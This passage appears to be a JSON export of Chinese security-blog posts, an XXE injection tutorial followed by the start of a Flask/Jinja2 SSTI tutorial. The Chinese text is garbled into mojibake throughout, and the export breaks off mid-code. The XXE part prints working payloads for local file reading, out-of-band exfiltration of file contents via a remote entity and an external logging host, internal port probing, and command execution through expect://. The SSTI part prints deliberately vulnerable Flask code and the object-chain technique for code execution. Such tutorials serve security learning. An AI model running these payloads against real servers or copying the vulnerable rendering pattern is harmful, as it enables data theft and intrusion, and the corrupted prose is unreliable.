payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://localhost:88/?content=%file;'&gt;&quot;&gt; %payload; è°ƒç”¨è¿‡ç¨‹å’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ XMLä¸­çš„åè®®æ”¯æŒ ä¸Šå›¾æ˜¯é»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥æ”¯æŒå…¶ä»–ï¼Œå¦‚PHPæ”¯æŒçš„æ‰©å±•åè®®æœ‰ XXEæ³¨å…¥å®šä¹‰XXEæ³¨å…¥ï¼Œå³XML å¤–éƒ¨å®ä½“æ³¨å…¥ã€‚é€šè¿‡XMLå®ä½“ï¼Œâ€œSYSTEMâ€å…³é”®è¯å¯¼è‡´XMLè§£æå™¨å¯ä»¥ä»æœ¬åœ°æ–‡ä»¶æˆ–è€…è¿œç¨‹URIä¸­è¯»å–æ•°æ®ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥é€šè¿‡XMLå®ä½“ä¼ é€’è‡ªå·±æ„é€ çš„æ¶æ„å€¼ï¼Œæ˜¯å¤„ç†ç¨‹åºè§£æå®ƒã€‚å½“åº”ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚ ENTITYå®ä½“ï¼Œåœ¨ä¸€ä¸ªç”šè‡³å¤šä¸ªXMLæ–‡æ¡£ä¸­é¢‘ç¹ä½¿ç”¨æŸä¸€æ¡æ•°æ®ï¼Œæˆ‘ä»¬é¢„å…ˆå®šä¹‰ä¸€ä¸ªè¿™æ¡æ•°æ®çš„â€åˆ«åâ€ï¼Œå³ä¸€ä¸ªENTITYï¼Œç„¶åå†è¿™äº›æ–‡æ¡£ä¸­éœ€è¦è¯¥æ•°æ®çš„åœ°æ–¹è°ƒç”¨å®ƒã€‚XMLå®šä¹‰äº†ä¸¤ç§ç±»å‹çš„ENTITYï¼Œä¸€ç§åœ¨XMLæ–‡æ¡£ä¸­ä½¿ç”¨ è‹¥æ˜¯åœ¨PHPä¸­ï¼Œè‹¥æ˜¯åœ¨PHPä¸­,libxml_disable_entity_loaderè®¾ç½®ä¸ºTRUEå¯ç¦ç”¨å¤–éƒ¨å®ä½“æ³¨ã€‚å…¥å¦ä¸€ç§ä½œä¸ºå‚æ•°åœ¨DTDæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚ENTITYçš„å®šä¹‰è¯­æ³•ï¼š &lt;!DOCTYPE æ–‡ä»¶å [&lt;!ENTITY å®ä½“å &quot;å®ä½“å†…å®¹&quot;&gt;]&gt;å®šä¹‰å¥½çš„ENTITYåœ¨æ–‡æ¡£ä¸­é€šè¿‡â€œ&amp;å®ä½“å;â€æ¥ä½¿ç”¨ã€‚ä¸¾ä¾‹ï¼š&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE booklist [&lt;!ENTITY publisher &quot;ABC company&quot;&gt;]&gt;&lt;booklist&gt;&lt;book&gt;&lt;name&gt;Ajax&lt;/name&gt;&lt;price&gt;$5.95&lt;/price&gt;&lt;description&gt;Foundations of Ajax.&lt;/description&gt;&lt;publisher&gt;&amp;publisher;&lt;/publisher&gt; è¿™é‡Œçš„&amp;publisher;ä¼šè¢«â€œABC companyâ€æ›¿æ¢&lt;/book&gt;&lt;book&gt;&lt;name&gt;Ajax Patterns&lt;/name&gt;&lt;price&gt;$7.95&lt;/price&gt;&lt;description&gt;Introduction of Ajax Patterns.&lt;/description&gt;&lt;publisher&gt;&amp;publisher;&lt;/publisher&gt; è¿™é‡Œçš„&amp;publisher;ä¼šè¢«â€œABC companyâ€æ›¿æ¢&lt;/book&gt;&lt;/booklist&gt; åœ¨ XML ä¸­æœ‰ 5 ä¸ªé¢„å®šä¹‰çš„å®ä½“å¼•ç”¨ï¼š &lt; &lt; å°äº &gt; &gt; å¤§äº &amp; &amp; å’Œå· &apos; â€˜ çœç•¥å· &quot; â€œ å¼•å· æ³¨é‡Šï¼šä¸¥æ ¼åœ°è®²ï¼Œåœ¨ XML ä¸­ä»…æœ‰å­—ç¬¦ â€œ&lt;â€å’Œâ€&amp;â€ æ˜¯éæ³•çš„ã€‚çœç•¥å·ã€å¼•å·å’Œå¤§äºå·æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯æŠŠå®ƒä»¬æ›¿æ¢ä¸ºå®ä½“å¼•ç”¨æ˜¯ä¸ªå¥½çš„ä¹ æƒ¯ã€‚ 7.XXEæ¼æ´åŸç†æ—¢ç„¶XMLå¯ä»¥ä»å¤–éƒ¨è¯»å–DTDæ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å°±è‡ªç„¶åœ°æƒ³åˆ°äº†å¦‚æœå°†è·¯å¾„æ¢æˆå¦ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„ï¼Œé‚£ä¹ˆæœåŠ¡å™¨åœ¨è§£æè¿™ä¸ªXMLçš„æ—¶å€™å°±ä¼šæŠŠé‚£ä¸ªæ–‡ä»¶çš„å†…å®¹èµ‹å€¼ç»™SYSTEMå‰é¢çš„æ ¹å…ƒç´ ä¸­ï¼Œåªè¦æˆ‘ä»¬åœ¨XMLä¸­è®©å‰é¢çš„æ ¹å…ƒç´ çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸å°±å¯ä»¥è¯»å–é‚£ä¸ªæ–‡ä»¶çš„å†…å®¹äº†ã€‚è¿™å°±é€ æˆäº†ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ã€‚ é‚£å¦‚æœæˆ‘ä»¬æŒ‡å‘çš„æ˜¯ä¸€ä¸ªå†…ç½‘ä¸»æœºçš„ç«¯å£å‘¢ï¼Ÿæ˜¯å¦ä¼šç»™å‡ºé”™è¯¯ä¿¡æ¯ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä»é”™è¯¯ä¿¡æ¯ä¸Šæ¥åˆ¤æ–­å†…ç½‘ä¸»æœºè¿™ä¸ªç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œè¿™å°±é€ æˆäº†ä¸€ä¸ªå†…éƒ¨ç«¯å£è¢«æ¢æµ‹çš„é—®é¢˜ã€‚å¦å¤–ï¼Œä¸€èˆ¬æ¥è¯´ï¼ŒæœåŠ¡å™¨è§£æXMLæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ä¸€æ¬¡æ€§å°†æ•´ä¸ªXMLåŠ è½½è¿›å†…å­˜ä¸­ï¼Œè¿›è¡Œè§£æï¼›å¦ä¸€ç§æ˜¯ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†çš„ã€â€œæµå¼â€åœ°åŠ è½½ã€è§£æã€‚å¦‚æœæˆ‘ä»¬é€’å½’åœ°è°ƒç”¨XMLå®šä¹‰ï¼Œä¸€æ¬¡æ€§è°ƒç”¨å·¨é‡çš„å®šä¹‰ï¼Œé‚£ä¹ˆæœåŠ¡å™¨çš„å†…å­˜å°±ä¼šè¢«æ¶ˆè€—å®Œï¼Œé€ æˆäº†æ‹’ç»æœåŠ¡æ”»å‡»ã€‚ 1.ä»»æ„æ–‡ä»¶è¯»å–payloadå¦‚ä¸‹: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///D://phpStudy//WWW//aa.txt&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; è¯»å–aa.txtçš„å†…å®¹: 2.æ¢æµ‹sqlç›²æ³¨ä¸€èˆ¬åœ¨æ¼æ´æŒ–æ˜ä¸­æˆ‘ä»¬æ˜¯çŒœæµ‹ä¸åˆ° &lt;root&gt;&lt;/root&gt; é‡Œé¢æ˜¯nameæ ‡ç­¾çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨å¦ä¸€ç§æ–¹æ³•æ›´é è°±:æ¨èç½‘ç«™:http://ceye.io/payloads æ‰¾åˆ°ç½‘ç«™ä¸Šè‡ªå¸¦çš„XMLæ³¨å…¥åˆ©ç”¨ä»£ç : ç¨å¾®æ•´ç†ä¸‹ç”Ÿæˆpayloadå¦‚ä¸‹: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://9j4jd9.ceye.io/xxe_test&quot;&gt;%remote;]&gt;&lt;root/&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://9j4jd9.ceye.io/xxe_test&quot;&gt;%remote;]&gt;&lt;root/&gt; çœ‹ä¸‹ç°åœ¨æ˜¯å‡ ç‚¹é’Ÿ: æ™šä¸Šå…«ç‚¹å¤šé’Ÿ,æˆ‘ä»¬å¤åˆ¶payloadå‘é€è¯·æ±‚: çœ‹ä¸‹ç½‘ç«™é‡Œé¢è‡ªå¸¦çš„æ—¥å¿—åŠŸèƒ½: åº”è¯¥æ˜¯æ—¶é—´å»¶è¿Ÿé—®é¢˜ã€‚åæ­£ç›¸å·®ååˆ†é’Ÿä»¥å†…! è¿™é‡Œæ¥æ”¶åˆ°æˆ‘ä»¬çš„payloadè¯·æ±‚è¯´æ˜æ˜¯å­˜åœ¨XMLæ³¨å…¥çš„ï¼Œç”¨è¿™ç§æ–¹æ³•æµ‹è¯•XMLæ³¨å…¥æˆ‘æ„Ÿè§‰å¾ˆå¥½ 1.å¯ä»¥æ— é™åˆ¶ç›²æ‰“ 2.æµ‹è¯•ç®€å•æ–¹ä¾¿ä¸éœ€è¦å¾ˆç¹çæµ‹è¯•çŒœæµ‹ 3.æ¢æµ‹å†…ç½‘åœ°å€payloadå¦‚ä¸‹:&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.100:80&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; æˆåŠŸæ¢æµ‹åˆ°å†…ç½‘ç«¯å£å†…éƒ¨ä¿¡æ¯ã€‚ æˆ‘è¿™æ˜¯åœ¨windowsä¸‹æµ‹è¯•ï¼Œå‡å¦‚æ˜¯linuxä¸‹è¿˜å¯ä»¥å‘½ä»¤æ‰§è¡Œ: åœ¨å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ æµ‹è¯•payload: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://ifconfig&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; è¿™é‡Œè¯»å–ç³»ç»Ÿå‘½ä»¤ifconfigè¯»å–ip å‚è€ƒ:https://www.cnblogs.com/backlion/p/9302528.html å¤§è‡´å­¦ä¹ ä¸€ä¸‹XMLçš„ä¸€äº›è¯­æ³•ä»¥åŠXMLçš„æ³¨å…¥æ¼æ´","link":"/2021/04/10/xml%E6%B3%A8%E5%85%A5%E4%B8%8Exxe%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"title":"python SSTIæ³¨å…¥(ä¸€)","text":"åŸºç¡€çŸ¥è¯†å­¦ä¹ ä»€ä¹ˆæ˜¯SSTIæ³¨å…¥sstiæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œsstiä¸»è¦ä¸ºpythonçš„ä¸€äº›æ¡†æ¶ jinja2 mako tornado djangoï¼ŒPHPæ¡†æ¶smarty twigï¼Œjavaæ¡†æ¶jade velocityç­‰ç­‰ä½¿ç”¨äº†æ¸²æŸ“å‡½æ•°æ—¶ï¼Œç”±äºä»£ç ä¸è§„èŒƒæˆ–ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥è€Œå¯¼è‡´äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæ¨¡æ¿æ¸²æŸ“å…¶å®å¹¶æ²¡æœ‰æ¼æ´ï¼Œä¸»è¦æ˜¯ç¨‹åºå‘˜å¯¹ä»£ç ä¸è§„èŒƒä¸ä¸¥è°¨é€ æˆäº†æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œé€ æˆæ¨¡æ¿å¯æ§ã€‚æœ¬æ–‡ç€é‡å¯¹flaskæ¨¡æ¿æ³¨å…¥è¿›è¡Œæµ…æã€‚ from flask import Flaskfrom flask import requestfrom flask import configfrom flask import render_template_stringapp = Flask(__name__)app.config['SECRET_KEY'] = &quot;flag{SSTI_123456}&quot;@app.route('/')def hello_world(): return 'Hello World!'@app.errorhandler(404)def page_not_found(e): template = '''{%% block body %%} &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; {%% endblock %%}''' % (request.args.get('404_url')) return render_template_string(template), 404if __name__ == '__main__': app.run(host='0.0.0.0',debug=True) æ­¤æ—¶ä¼ å‚çš„å˜é‡ä¸º404_urlï¼Œå¦‚æœæˆ‘ä»¬è®¿é—® ?404_url={{1-1}} é¡µé¢å°†è¿”å›0ã€‚ åœ¨ {{}} é‡Œï¼Œä»–å°†æˆ‘ä»¬çš„ä»£ç è¿›è¡Œäº†æ‰§è¡Œã€‚æœåŠ¡å™¨å°†æˆ‘ä»¬çš„æ•°æ®ç»è¿‡å¼•æ“è§£æçš„æ—¶å€™ï¼Œè¿›è¡Œäº†æ‰§è¡Œï¼Œæ¨¡æ¿æ³¨å…¥ä¸sqlæ³¨å…¥æˆå› æœ‰ç‚¹ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä¿¡ä»»äº†ç”¨æˆ·çš„è¾“å…¥ï¼Œå°†ä¸å¯é çš„ç”¨æˆ·è¾“å…¥ä¸ç»è¿‡æ»¤ç›´æ¥è¿›è¡Œäº†æ‰§è¡Œï¼Œç”¨æˆ·æ’å…¥äº†æ¶æ„ä»£ç åŒæ ·ä¹Ÿä¼šæ‰§è¡Œã€‚ ç›´æ¥å°†ç”¨æˆ·å¯æ§å‚æ•°request.args.get('404_url')åœ¨æ¨¡æ¿ä¸­ç›´æ¥æ¸²æŸ“å¹¶ä¼ å›é¡µé¢ä¸­ï¼Œè¿™ç§ä¸æ­£ç¡®çš„æ¸²æŸ“æ–¹æ³•ä¼šäº§ç”Ÿæ¨¡æ¿æ³¨å…¥(SSTI)ã€‚ Jinja2æ¸²æŸ“æ¨¡æ¿ç®€ä»‹jinja2æ˜¯Pythonçš„ä¸€ä¸ªæµè¡Œçš„æ¨¡æ¿å¼•æ“ã€‚Webæ¨¡æ¿ç³»ç»Ÿå°†æ¨¡æ¿ä¸ç‰¹å®šæ•°æ®æºç»„åˆä»¥å‘ˆç°åŠ¨æ€ç½‘é¡µã€‚ åŸºæœ¬è¯­æ³•0x01 {%%} ä¸»è¦ç”¨æ¥å£°æ˜å˜é‡æˆ–ç”¨åœ¨æ¡ä»¶è¯­å¥æˆ–å¾ªç¯è¯­å¥ æ³¨æ„æ¡ä»¶å’Œå¾ªç¯éœ€è¦å¤šä¸€å±‚ {%endif%} æˆ– {%endfor%}ç”¨ä½œç»“å°¾{% set c = 'Zh1z3ven' %}{% if 1==1 %}Zh1z3ven{%endif%}{% for i in [1, 2, 3] %}Zh1z3ven{%endfor%} 0x02 `{{}}` å°†å¤§æ‹¬å·å†…çš„è¡¨è¾¾å¼æ‰§è¡Œå¹¶è¾“å‡ºç»“æœåˆ°æ¨¡æ¿å†… {{98-2}} # 96 0x03 `{##}` æ³¨é‡Š []ï¼Œ{}ï¼Œâ€ æ˜¯Pythonä¸­çš„å†…ç½®å˜é‡ã€‚é€šè¿‡å†…ç½®å˜é‡çš„ä¸€äº›å±æ€§æˆ–å‡½æ•°å»è®¿é—®å½“å‰Pythonç¯å¢ƒä¸­çš„å¯¹è±¡ç»§æ‰¿æ ‘ï¼Œå¯ä»¥ä»ç»§æ‰¿æ ‘çˆ¬åˆ°æ ¹å¯¹è±¡ç±»ã€‚åˆ©ç”¨__subclasses__()ç­‰å‡½æ•°çˆ¬å‘æ¯ä¸€ä¸ªObject,è¿™æ ·ä¾¿å¯ä»¥åˆ©ç”¨å½“å‰Pythonç¯å¢ƒæ‰§è¡Œä»»æ„ä»£ç ã€‚ æ¨¡æ¿å¼•æ“é¦–å…ˆæˆ‘ä»¬å…ˆè®²è§£ä¸‹ä»€ä¹ˆæ˜¯æ¨¡æ¿å¼•æ“ï¼Œä¸ºä»€ä¹ˆéœ€è¦æ¨¡æ¿ï¼Œæ¨¡æ¿å¼•æ“å¯ä»¥è®©ï¼ˆç½‘ç«™ï¼‰ç¨‹åºå®ç°ç•Œé¢ä¸æ•°æ®åˆ†ç¦»ï¼Œä¸šåŠ¡ä»£ç ä¸é€»è¾‘ä»£ç çš„åˆ†ç¦»ï¼Œè¿™å¤§å¤§æå‡äº†å¼€å‘æ•ˆç‡ï¼Œè‰¯å¥½çš„è®¾è®¡ä¹Ÿä½¿å¾—ä»£ç é‡ç”¨å˜å¾—æ›´åŠ å®¹æ˜“ã€‚ä½†æ˜¯å¾€å¾€æ–°çš„å¼€å‘éƒ½ä¼šå¯¼è‡´ä¸€äº›å®‰å…¨é—®é¢˜ï¼Œè™½ç„¶æ¨¡æ¿å¼•æ“ä¼šæä¾›æ²™ç®±æœºåˆ¶ï¼Œä½†åŒæ ·å­˜åœ¨æ²™ç®±é€ƒé€¸æŠ€æœ¯æ¥ç»•è¿‡ã€‚ æ¨¡æ¿åªæ˜¯ä¸€ç§æä¾›ç»™ç¨‹åºæ¥è§£æçš„ä¸€ç§è¯­æ³•ï¼Œæ¢å¥è¯è¯´ï¼Œæ¨¡æ¿æ˜¯ç”¨äºä»æ•°æ®ï¼ˆå˜é‡ï¼‰åˆ°å®é™…çš„è§†è§‰è¡¨ç°ï¼ˆHTMLä»£ç ï¼‰è¿™é¡¹å·¥ä½œçš„ä¸€ç§å®ç°æ‰‹æ®µï¼Œè€Œè¿™ç§æ‰‹æ®µä¸è®ºåœ¨å‰ç«¯è¿˜æ˜¯åç«¯éƒ½æœ‰åº”ç”¨ã€‚ é€šä¿—ç‚¹ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚ åç«¯æ¸²æŸ“ï¼šæµè§ˆå™¨ä¼šç›´æ¥æ¥æ”¶åˆ°ç»è¿‡æœåŠ¡å™¨è®¡ç®—ä¹‹åçš„å‘ˆç°ç»™ç”¨æˆ·çš„æœ€ç»ˆçš„HTMLå­—ç¬¦ä¸²ï¼Œè®¡ç®—å°±æ˜¯æœåŠ¡å™¨åç«¯ç»è¿‡è§£ææœåŠ¡å™¨ç«¯çš„æ¨¡æ¿æ¥å®Œæˆçš„ï¼Œåç«¯æ¸²æŸ“çš„å¥½å¤„æ˜¯å¯¹å‰ç«¯æµè§ˆå™¨çš„å‹åŠ›è¾ƒå°ï¼Œä¸»è¦ä»»åŠ¡åœ¨æœåŠ¡å™¨ç«¯å°±å·²ç»å®Œæˆã€‚ å‰ç«¯æ¸²æŸ“ï¼šå‰ç«¯æ¸²æŸ“ç›¸åï¼Œæ˜¯æµè§ˆå™¨ä»æœåŠ¡å™¨å¾—åˆ°ä¿¡æ¯ï¼Œå¯èƒ½æ˜¯jsonç­‰æ•°æ®åŒ…å°è£…çš„æ•°æ®ï¼Œä¹Ÿå¯èƒ½æ˜¯htmlä»£ç ï¼Œä»–éƒ½æ˜¯ç”±æµè§ˆå™¨å‰ç«¯æ¥è§£ææ¸²æŸ“æˆhtmlçš„äººä»¬å¯è§†åŒ–çš„ä»£ç è€Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ï¼Œå¥½å¤„æ˜¯å¯¹äºæœåŠ¡å™¨åç«¯å‹åŠ›è¾ƒå°ï¼Œä¸»è¦æ¸²æŸ“åœ¨ç”¨æˆ·çš„å®¢æˆ·ç«¯å®Œæˆã€‚ è®©æˆ‘ä»¬ç”¨ä¾‹å­æ¥ç®€ææ¨¡æ¿æ¸²æŸ“ã€‚ &lt;html&gt;&lt;div&gt;{$what}&lt;/div&gt;&lt;/html&gt; æˆ‘ä»¬æƒ³è¦å‘ˆç°åœ¨æ¯ä¸ªç”¨æˆ·é¢å‰è‡ªå·±çš„åå­—ã€‚ä½†æ˜¯{$what}æˆ‘ä»¬ä¸çŸ¥é“ç”¨æˆ·åå­—æ˜¯ä»€ä¹ˆï¼Œç”¨ä¸€äº›urlæˆ–è€…cookieåŒ…å«çš„ä¿¡æ¯ï¼Œæ¸²æŸ“åˆ°whatå˜é‡é‡Œï¼Œå‘ˆç°ç»™ç”¨æˆ·çš„ä¸º &lt;html&gt;&lt;div&gt;å¼ ä¸‰&lt;/div&gt;&lt;/html&gt; å½“ç„¶è¿™åªæ˜¯æœ€ç®€å•çš„ç¤ºä¾‹ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œè‡³å°‘ä¼šæä¾›åˆ†æ”¯ï¼Œè¿­ä»£ã€‚è¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°ã€‚ ä½¿ç”¨å‡½æ•°åœ¨Pythonçš„sstiä¸­ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¾é åŸºç±»-&gt;å­ç±»-&gt;å±é™©å‡½æ•°çš„æ–¹å¼æ¥åˆ©ç”¨sstiï¼Œæ¥ä¸‹æ¥è®²å‡ ä¸ªçŸ¥è¯†ç‚¹ã€‚ __class__ ä¸‡ç‰©çš†å¯¹è±¡ï¼Œè€Œclassç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»ï¼Œæ¯”å¦‚æŸä¸ªå­—ç¬¦ä¸²ï¼Œä»–çš„å¯¹è±¡ä¸ºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œè€Œå…¶æ‰€å±çš„ç±»ä¸º&lt;class 'str'&gt;ã€‚ __bases__ ä»¥å…ƒç»„çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚ __base__ ä»¥å­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»ã€‚ __mro__ è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºã€‚ __subclasses__() è·å–ç±»çš„æ‰€æœ‰å­ç±»ã€‚ __init__ æ‰€æœ‰è‡ªå¸¦å¸¦ç±»éƒ½åŒ…å«initæ–¹æ³•ï¼Œä¾¿äºåˆ©ç”¨ä»–å½“è·³æ¿æ¥è°ƒç”¨globalsã€‚ __globals__ function.__globals__ï¼Œç”¨äºè·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚è¯¥å±æ€§æ˜¯å‡½æ•°ç‰¹æœ‰çš„å±æ€§,è®°å½•å½“å‰æ–‡ä»¶å…¨å±€å˜é‡çš„å€¼,å¦‚æœæŸä¸ªæ–‡ä»¶è°ƒç”¨äº†osã€sysç­‰åº“,ä½†æˆ‘ä»¬åªèƒ½è®¿é—®è¯¥æ–‡ä»¶æŸä¸ªå‡½æ•°æˆ–è€…æŸä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨globalså±æ€§è®¿é—®å…¨å±€çš„å˜é‡ã€‚è¯¥å±æ€§ä¿å­˜çš„æ˜¯å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ã€‚ __builtins__ __builtins__ä¸‹æœ‰evalï¼Œ__import__ç­‰çš„å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ã€‚ åœ¨çœ‹å®Œä¸Šè¾¹è¿™äº›è‡ªå¸¦æ–¹æ³•ã€æˆå‘˜å˜é‡åï¼Œå¯èƒ½æœ‰ç‚¹æ‡µï¼Œæ¥ä¸‹æ¥çœ‹çœ‹æ˜¯å¦‚ä½•åˆ©ç”¨è¿™äº›æ–¹æ³•ä»¥åŠæˆå‘˜å˜é‡è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„çš„ã€‚ åœ¨SSTIä¸­ï¼Œæˆ‘ä»¬è¦åšçš„æ— éå°±ä¸¤ä¸ªï¼š æ‰§è¡Œå‘½ä»¤ è·å–æ–‡ä»¶å†…å®¹ æ‰€ä»¥æˆ‘ä»¬æ‰€åšçš„ä¸€åˆ‡å®é™…ä¸Šéƒ½æ˜¯åœ¨å¾€è¿™ä¸¤ä¸ªç»“æœé æ‹¢ã€‚ ä¾‹1: for c in []._class_._base_.subclasses_()#é€šè¿‡å†…ç½®å˜é‡è®¿é—®ç±»â€”â€”&gt;ä½¿ç”¨baseè¾“å‡ºç±»çš„çˆ¶çº§â€”â€”åœ¨é€šè¿‡subclasses()æ‰¾åˆ°æ‰€æœ‰æ­¤çˆ¶çº§çš„å­çº§ã€‚ SSTIæ³¨å…¥äº§ç”ŸåŸå› :from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route('/')def test1(): name = request.args.get('name') t = Template('''&lt;html&gt; &lt;head&gt; &lt;title&gt;hwg&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, %s !&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; '''% (name)) return t.render()if __name__ == '__main__': app.run()###############################&lt;html&gt; &lt;head&gt; &lt;title&gt;{{title}} - hwg&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;###########################from flask import Flaskfrom flask import render_templateapp = Flask(__name__)@app.route('/')@app.route('/index')def index(): user = { 'name' : 'hwg', 'info' : 'I am hwg' } return render_template(&quot;index.html&quot;, title='Home', user=user)if __name__ == '__main__': app.run() å¯¹æ¯”ä¸Šä¸‹ä¸¤ç§ä»£ç ä¹¦å†™ä¸¤ç§å½¢å¼:åœ¨ç¬¬ä¸€ç§ä¸­ï¼Œnameå‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œnameå‚æ•°åé¢ä¼šè¢«ç›´æ¥æ¸²æŸ“å¹¶å°†ç»“æœå¾…ä¼šé¡µé¢å›æ˜¾ï¼Œæ‰€ä»¥è¿™æ—¶å°±æœ‰äº†sstiæ³¨å…¥:åœ¨ç¬¬äºŒç§ä¸­:åœ¨flaskä¸­å¸¸ç”¨çš„æ¸²æŸ“æ–¹æ³•ä¸ºrender_template() ã€ render_template_string() å½“ä½¿ç”¨ render_template() æ—¶ï¼Œæ‰©å±•åä¸º .html ã€ .htm ã€ .xml å’Œ .xhtml çš„æ¨¡æ¿ä¸­å¼€å¯è‡ªåŠ¨è½¬ä¹‰ã€‚ å½“ä½¿ç”¨ render_template_string() æ—¶ï¼Œå­—ç¬¦ä¸²å¼€å¯ è‡ªåŠ¨è½¬ä¹‰ã€‚åˆ†æä¸€ä¸‹ï¼Œå°±æ˜¯æ­¤æ—¶é¡µé¢æ•°æ®å·²ç»ç¡®å®šï¼Œå¹¶ä¸”æ¸²æŸ“æ—¶å°†ä¼šè¢«è½¬ä¹‰ï¼Œå³ä½ è¾“å…¥çš„æ•°æ®ä¸ä¼šè¢«å½“åšæŒ‡ä»¤æ‰§è¡Œï¼Œè€Œæ˜¯ä½œä¸ºé‚£ä¸¤ä¸ªèŠ±æ‹¬å·çš„ä¸€ä¸ªå†…å®¹è¿›è¡Œæ¸²æŸ“ï¼Œå¯ä»¥çœ‹åˆ°render_templateæ¸²æŸ“çš„å†…å®¹æ˜¯index.htmlï¼Œè€Œä¸æ˜¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚æ‰€ä»¥sstiäº§ç”ŸåŸå› ä¾¿æ˜¯ï¼š1.å­˜åœ¨ç”¨æˆ·å¯æ§å‚æ•°2.ç”¨æˆ·è¾“å…¥å‚æ•°ç›´æ¥è¢«æ¸²æŸ“ï¼Œå³ {{}} å¯è¢«å¸¦å…¥ä»£ç ä¸­è®©jinja2æ¨¡å—è¯†åˆ«å¹¶è§£æ flaskâ€”â€”sstiç¯å¢ƒå®æˆ˜:from flask import Flaskfrom flask import render_templatefrom flask import requestfrom flask import render_template_stringapp = Flask(__name__)@app.route('/test',methods=['GET', 